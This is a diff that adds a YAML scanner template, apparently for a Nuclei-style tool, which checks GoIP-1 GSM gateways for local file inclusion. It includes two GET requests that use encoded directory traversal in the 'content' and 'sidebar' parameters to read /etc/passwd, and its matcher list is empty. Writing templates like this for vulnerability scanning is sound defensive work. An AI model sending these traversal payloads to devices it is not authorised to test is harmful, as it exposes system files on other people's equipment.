@@ -1,0 +1,19 @@
+id: goip-1-lfi
+brief:
+    title: GoIP-1 GSM - Local File Inclusion
+    by: gy741
+    level: high
+    about: GoIP-1 GSM is vulnerable to local file inclusion because input passed thru the 'content' or 'sidebar' GET parameter in 'frame.html' or 'frame.A100.html' is not properly sanitized before being used ...
+    label:
+        - gsm
+        - goip
+        - lfi
+        - iot
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/default/en_US/frame.html?content=..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
+        - '{{BaseURL}}/default/en_US/frame.A100.html?sidebar=..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
+      signs: []
